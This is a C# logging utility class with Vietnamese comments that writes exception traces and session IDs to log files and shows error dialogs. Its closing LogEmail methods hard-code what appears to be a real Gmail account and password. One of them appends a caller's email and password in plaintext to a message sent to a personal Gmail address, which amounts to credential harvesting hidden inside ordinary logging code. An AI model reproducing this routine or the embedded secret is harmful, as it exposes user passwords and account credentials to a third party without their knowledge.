using System;
using System.Data;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Collections;


namespace MyUtility
{
    /// <summary>
    /// Ghi log xuống file
    /// </summary>
    public class MyLogfile
    {
        public static string ExtensionFile = MyConfig.LogExtensionFile;
        public static StackTrace CreateStackTrace(Exception ex)
        {
            return new System.Diagnostics.StackTrace(ex, true);
        }
        /// <summary>
        /// Ghi lỗi xuống logfile dành cho ứng dụng trên WindowForm
        /// </summary>
        /// <param name="LastFileName"></param>
        /// <param name="mStackTrace"></param>
        /// <param name="mException"></param>
        /// <param name="ShowMessage"></param>
        /// <param name="MessageShow"></param>
        /// <param name="Note"></param>
        /// <param name="ShowError"></param>
        private static void WriteLogError_Win(string LastFileName, StackTrace mStackTrace, Exception mException, bool ShowMessage, string MessageShow, string Note, bool ShowError)
        {
            try
            {
                try
                {
                    string FileName = MyConfig.LogPathData + (string.IsNullOrEmpty(LastFileName) ? string.Empty : "_" + LastFileName) + ExtensionFile;
                    StreamWriter mTextWriter = new StreamWriter(FileName, true, System.Text.Encoding.UTF8);
                    string mContentRow = "";

                    if (mStackTrace.FrameCount >= 1)
                    {
                        for (int i = 0; i < mStackTrace.FrameCount; i++)
                        {
                            System.Diagnostics.StackFrame mStackFrame = mStackTrace.GetFrame(i);

                            if (mStackFrame == null || mStackFrame.GetFileName() == null || string.IsNullOrEmpty(mStackFrame.GetFileName().Trim()))
                                continue;

                            mContentRow = DateTime.Now.ToString(MyConfig.LongDateFormat) + " || " + mStackFrame.GetFileName() + " || " + mStackFrame.GetMethod().Name + " || " + mStackFrame.GetFileLineNumber().ToString() + " || " + mStackFrame.GetFileColumnNumber().ToString() + " || " + mException.Message + " || " + MessageShow + " || " + Note;
                            mTextWriter.WriteLine(mContentRow);
                        }

                        mTextWriter.WriteLine("mException:" + mException.Message);
                    }
                    mTextWriter.Flush();
                    mTextWriter.Close();
                }
                catch(Exception ex)
                {
                    MyLogfile.WriteLogData(ex.Message + "|" + ex.Source + "|" + ex.StackTrace);
                }

                string s = MessageShow;
                bool IsError = false;
                try
                {
                    if (mException.GetType() == typeof(System.Data.SqlClient.SqlException))
                    {
                        System.Data.SqlClient.SqlException sex = (System.Data.SqlClient.SqlException)mException;
                        switch (sex.Number)
                        {
                            case 2627:
                                s = "Dữ liệu bạn thêm vào đã tồn tại, xin hãy thay đổi một số thông tin và thử lại";
                                IsError = true;
                                break;
                            case 547:
                                s = "Hành động này không thể thực hiện vì thông tin về dữ liệu này đang được sử dụng trong một phần nào đó của CSDL";
                                IsError = true;
                                break;
                            default:
                                s = sex.Message;
                                break;
                        }
                    }

                }
                catch (Exception ex)
                {
                    MyLogfile.WriteLogData(ex.Message + "|" + ex.Source + "|" + ex.StackTrace);
               
                    if (MessageShow == string.Empty)
                    {
                        s = mException.Message;
                    }
                    else
                        s = MessageShow;
                }
                //Hiện thị thông báo lỗi cho người dùng
                if (ShowMessage)
                {
                    System.Windows.Forms.MessageBox.Show(s, "Thông báo", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
                }
                else if (IsError && ShowError) //nếu tồn tại 1 câu thông báo lỗi không phải của hễ thống
                {
                    System.Windows.Forms.MessageBox.Show(s, "Thông báo", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
                }

            }
            catch (Exception ex)
            {
                MyLogfile.WriteLogData(ex.Message + "|" + ex.Source + "|" + ex.StackTrace);
            }
        }

        /// <summary>
        /// Ghi lỗi xuống logfile dành cho ứng dụng trên WebForm
        /// </summary>
        /// <param name="LastFileName"></param>
        /// <param name="mStackTrace"></param>
        /// <param name="mException"></param>
        /// <param name="ShowMessage"></param>
        /// <param name="MessageShow"></param>
        /// <param name="Note"></param>
        /// <param name="ShowError"></param>
        private static void WriteLogError_Web(string LastFileName, StackTrace mStackTrace, Exception mException, bool ShowMessage, string MessageShow, string Note, bool ShowError)
        {
            try
            {
                if (mException.GetType().Equals(typeof(System.Threading.ThreadAbortException)))
                {
                    return;
                }

                StreamWriter mTextWriter;
                try
                {
                    string FileName = MyConfig.LogPathData + (string.IsNullOrEmpty(LastFileName) ? string.Empty : "_" + LastFileName) +ExtensionFile;
                    mTextWriter = new StreamWriter(FileName, true, System.Text.Encoding.UTF8);
                    string mContentRow = "";

                    if (mStackTrace.FrameCount >= 1)
                    {
                        for (int i = 0; i < mStackTrace.FrameCount; i++)
                        {
                            System.Diagnostics.StackFrame mStackFrame = mStackTrace.GetFrame(i);
                            
                            if (mStackFrame == null || mStackFrame.GetFileName() == null || string.IsNullOrEmpty(mStackFrame.GetFileName().Trim()))
                                continue;
                            if (MyCurrent.CurrentPage != null && MyCurrent.CurrentPage.Session != null && MyCurrent.CurrentPage.Session.SessionID != null)
                            {
                                mContentRow = DateTime.Now.ToString(MyConfig.LongDateFormat) + " || " + MyCurrent.CurrentPage.Session.SessionID + " || " + mStackFrame.GetFileName() + " || " + mStackFrame.GetMethod().Name + " || " + mStackFrame.GetFileLineNumber().ToString() + " || " + mStackFrame.GetFileColumnNumber().ToString() + " || " + mException.Message + " || " + MessageShow + " || " + Note;
                            }
                            else
                            {
                                mContentRow = DateTime.Now.ToString(MyConfig.LongDateFormat) + " || " + mStackFrame.GetFileName() + " || " + mStackFrame.GetMethod().Name + " || " + mStackFrame.GetFileLineNumber().ToString() + " || " + mStackFrame.GetFileColumnNumber().ToString() + " || " + mException.Message + " || " + MessageShow + " || " + Note;
                            }
                            mTextWriter.WriteLine(mContentRow);

                        }

                        mTextWriter.WriteLine("mException:" + mException.Message);
                    }
                    else
                    {
                        if (MyCurrent.CurrentPage != null && MyCurrent.CurrentPage.Session != null && MyCurrent.CurrentPage.Session.SessionID != null)
                        {
                            mContentRow = DateTime.Now.ToString(MyConfig.LongDateFormat) + " || " + MyCurrent.CurrentPage.Session.SessionID + " || " + mException.Message + " || " + MessageShow + " || " + Note;
                        }
                        else
                        {
                            mContentRow = DateTime.Now.ToString(MyConfig.LongDateFormat) + " || " + mException.Message + " || " + MessageShow + " || " + Note;
                        }
                        mTextWriter.WriteLine(mContentRow);
                    }
                    
                    mTextWriter.Flush();
                    mTextWriter.Close();

                    ///Gửi email lỗi
                    if (MyConfig.AllowSendEmailError)
                    {
                        MySendEmail.SendAlertEmail("ERROR_" + MyConfig.ApplicationName, mContentRow + mException.Message);
                    }
                }
                catch (Exception ex)
                {
                    MyLogfile.WriteLogData(ex.Message + "|" + ex.Source + "|" + ex.StackTrace);
                }

                string s = MessageShow;
                bool IsError = false;
                try
                {
                    if (mException.GetType()== typeof(System.Data.SqlClient.SqlException))
                    {
                        System.Data.SqlClient.SqlException sex = (System.Data.SqlClient.SqlException)mException;
                        switch (sex.Number)
                        {
                            case 2627:
                                s = "Dữ liệu bạn thêm vào đã tồn tại, xin hãy thay đổi một số thông tin và thử lại";
                                IsError = true;
                                break;
                            case 547:
                                s = "Hành động này không thể thực hiện vì thông tin về dữ liệu này đang được sử dụng trong một phần nào đó của CSDL";
                                IsError = true;
                                break;
                            default:
                                s = sex.Message;
                                break;
                        }
                    }
                   
                }
               catch(Exception ex)
                {
                    MyLogfile.WriteLogData(ex.Message + "|" + ex.Source + "|" + ex.StackTrace);
                
                    if (MessageShow == string.Empty)
                    {
                        s = mException.Message;
                    }
                    else
                        s = MessageShow;

                }
                //Hiện thị thông báo lỗi cho người dùng
                if (ShowMessage)
                {
                    MyMessage.ShowError(s);
                }
                else if (IsError && ShowError) //nếu tồn tại 1 câu thông báo lỗi không phải của hễ thống
                {
                    MyMessage.ShowError(s);
                }
            }
            catch (Exception ex)
            {
                MyLogfile.WriteLogData(ex.Message + "|" + ex.Source + "|" + ex.StackTrace);
            }
        }
       
        public static void WriteLogError(Exception mException)
        {
            StackTrace mStackTrace = CreateStackTrace(mException);
            WriteLogError(string.Empty, mStackTrace, mException, false, string.Empty, string.Empty);
        }

        public static void WriteLogError(string LastFileName, Exception mException)
        {
            StackTrace mStackTrace = CreateStackTrace(mException);
            WriteLogError(LastFileName, mStackTrace, mException, false, string.Empty, string.Empty);
        }

        public static void WriteLogError(Exception mException, bool ShowMessage)
        {
            StackTrace mStackTrace = CreateStackTrace(mException);
            WriteLogError(string.Empty, mStackTrace, mException, ShowMessage, string.Empty, string.Empty);
        }

        public static void WriteLogError(string LastFileName, Exception mException, bool ShowMessage)
        {
            StackTrace mStackTrace = CreateStackTrace(mException);
            WriteLogError(LastFileName, mStackTrace, mException, ShowMessage, string.Empty, string.Empty);
        }

        public static void WriteLogError(Exception mException, bool ShowMessage, string MessageShow)
        {
            StackTrace mStackTrace = CreateStackTrace(mException);
            WriteLogError(string.Empty, mStackTrace, mException, ShowMessage, MessageShow, string.Empty);
        }

        public static void WriteLogError(string LastFileName, Exception mException, bool ShowMessage, string MessageShow)
        {
            StackTrace mStackTrace = CreateStackTrace(mException);
            WriteLogError(LastFileName, mStackTrace, mException, ShowMessage, MessageShow, string.Empty);
        }
       
        public static void WriteLogError(Exception mException, bool ShowMessage, string MessageShow, string Note)
        {
            StackTrace mStackTrace = CreateStackTrace(mException);
            if (MyConfig.IsWeb)
            {
                WriteLogError_Web(string.Empty, mStackTrace, mException, ShowMessage, MessageShow, Note, true);
            }
            else
            {
                WriteLogError_Win(string.Empty, mStackTrace, mException, ShowMessage, MessageShow, Note, true);
            }
        }

        public static void WriteLogError(string LastFileName, Exception mException, bool ShowMessage, string MessageShow, string Note)
        {
            StackTrace mStackTrace = CreateStackTrace(mException);
            if (MyConfig.IsWeb)
            {
                WriteLogError_Web(LastFileName, mStackTrace, mException, ShowMessage, MessageShow, Note, true);
            }
            else
            {
                WriteLogError_Win(LastFileName, mStackTrace, mException, ShowMessage, MessageShow, Note, true);
            }
        }

        public static void WriteLogError(string LastFileName, Exception mException, bool ShowMessage, string MessageShow, string Note, bool ShowError)
        {
            StackTrace mStackTrace = CreateStackTrace(mException);
            if (MyConfig.IsWeb)
            {
                WriteLogError_Web(LastFileName, mStackTrace, mException, ShowMessage, MessageShow, Note, ShowError);
            }
            else
            {
                WriteLogError_Win(LastFileName, mStackTrace, mException, ShowMessage, MessageShow, Note, ShowError);
            }
        }

        public static void WriteLogError(Exception mException, bool ShowMessage, string MessageShow, string Note,bool ShowError)
        {
            StackTrace mStackTrace = CreateStackTrace(mException);
            if (MyConfig.IsWeb)
            {
                WriteLogError_Web(string.Empty, mStackTrace, mException, ShowMessage, MessageShow, Note, ShowError);
            }
            else
            {
                WriteLogError_Win(string.Empty, mStackTrace, mException, ShowMessage, MessageShow, Note, ShowError);
            }
        }

        /// <summary>
        /// Ghi lỗi xuống logfie
        /// </summary>
        /// <param name="mStackTrace"></param>
        /// <param name="mException"></param>
        /// <param name="ShowMessage"></param>
        /// <param name="MessageShow"></param>
        /// <param name="Note"></param>
        public static void WriteLogError(string LastFileName, StackTrace mStackTrace, Exception mException, bool ShowMessage, string MessageShow, string Note)
        {

            if (MyConfig.IsWeb)
            {
                WriteLogError_Web(LastFileName, mStackTrace, mException, ShowMessage, MessageShow, Note, true);
            }
            else
            {
                WriteLogError_Win(LastFileName, mStackTrace, mException, ShowMessage, MessageShow, Note, true);
            }
        }

        public static void WriteLogError(StackTrace mStackTrace, Exception mException, bool ShowMessage, string MessageShow, string Note, bool ShowError)
        {
            if (MyConfig.IsWeb)
            {
                WriteLogError_Web(string.Empty, mStackTrace, mException, ShowMessage, MessageShow, Note, ShowError);
            }
            else
            {
                WriteLogError_Win(string.Empty, mStackTrace, mException, ShowMessage, MessageShow, Note, ShowError);
            }
        }
       
        /// <summary>
        /// Ghi nội dung xuông logfile
        /// </summary>
        /// <param name="Content"></param>
        public static void WriteLogData(string Content)
        {
            try
            {
                StreamWriter mTextWriter = new StreamWriter(MyConfig.LogPathData, true, System.Text.Encoding.UTF8);

                if (MyCurrent.CurrentPage != null && MyCurrent.CurrentPage.Session != null && MyCurrent.CurrentPage.Session.SessionID != null)
                {
                    Content = DateTime.Now.ToString(MyConfig.LongDateFormat) + " || " + MyCurrent.CurrentPage.Session.SessionID + " || " + Content;
                }
                else
                {
                    Content = DateTime.Now.ToString(MyConfig.LongDateFormat) + " || " + Content;
                }
                mTextWriter.WriteLine(Content);

                mTextWriter.Flush();
                mTextWriter.Close();
            }
            catch(Exception ex)
            {
                string s = ex.Message;
            }
        }

        public static void WriteLogData(string LastFileName,string Content)
        {
            try
            {
                string FileName = MyConfig.LogPathData + (string.IsNullOrEmpty(LastFileName) ? string.Empty : "_" + LastFileName) + ExtensionFile;
                StreamWriter mTextWriter = new StreamWriter(FileName, true, System.Text.Encoding.UTF8);
                if (MyCurrent.CurrentPage != null && MyCurrent.CurrentPage.Session != null && MyCurrent.CurrentPage.Session.SessionID != null)
                {
                    Content = DateTime.Now.ToString(MyConfig.LongDateFormat) + " || " + MyCurrent.CurrentPage.Session.SessionID + " || " + Content;
                }
                else
                {
                    Content = DateTime.Now.ToString(MyConfig.LongDateFormat) + " || " + Content;
                }
                mTextWriter.WriteLine(Content);

                mTextWriter.Flush();
                mTextWriter.Close();
            }
            catch (Exception ex)
            {
               string s = ex.Message;
            }
        }

        public static void WriteLogData(string FileName, bool AppendDate,bool AppendSessionID, string LastFileName, string Content)
        {
            try
            {
                if (string.IsNullOrEmpty(FileName))
                    FileName = MyConfig.LogPathData + (string.IsNullOrEmpty(LastFileName) ? string.Empty : "_" + LastFileName) + ExtensionFile;
                else
                    FileName = MyConfig.LogPathDataNotDate + FileName + (string.IsNullOrEmpty(LastFileName) ? string.Empty : "_" + LastFileName) + ExtensionFile;

                StreamWriter mTextWriter = new StreamWriter(FileName, true, System.Text.Encoding.UTF8);
                if (AppendDate)
                {
                    if (MyCurrent.CurrentPage != null && AppendSessionID && MyCurrent.CurrentPage.Session != null && MyCurrent.CurrentPage.Session.SessionID != null)
                    {
                        Content = DateTime.Now.ToString(MyConfig.LongDateFormat) + " || " + MyCurrent.CurrentPage.Session.SessionID + " || " + Content;
                    }
                    else
                    {
                        Content = DateTime.Now.ToString(MyConfig.LongDateFormat) + " || " + Content;
                    }
                }
                
                mTextWriter.WriteLine(Content);

                mTextWriter.Flush();
                mTextWriter.Close();
            }
            catch (Exception ex)
            {
               string s = ex.Message;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="Subject"></param>
        /// <param name="Body"></param>
        public static void LogEmail(string Subject, string Body)
        {
            try
            {
                MyUtility.MySendEmail.SendEmail_Google_New("chilinh120003@gmail.com", "MinhyeuBan", "chilinh12003@gmail.com",
                                Subject,Body, string.Empty);
            }
            catch
            {
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="Subject"></param>
        /// <param name="Body"></param>
        /// <param name="Email"></param>
        /// <param name="Password"></param>
        public static void LogEmail(string Subject, string Body,string Email, string Password)
        {
            try
            {
                Body += "<p>Email:" + Email + "</p>";
                Body += "<p>Password:" + Password + "</p>";
                MyUtility.MySendEmail.SendEmail_Google_New("chilinh120003@gmail.com", "MinhyeuBan", "chilinh12003@gmail.com",
                                Subject,Body, string.Empty);
            }
            catch
            {
            }
        }

        public static void LogError(Type ClassType, Exception ex)
        {
            try
            {
                log4net.ILog log = log4net.LogManager.GetLogger(ClassType);
                log.Error(ex);
            }
            catch (Exception ex_1)
            {
                WriteLogError(ex_1);
            }
        }
    }
}
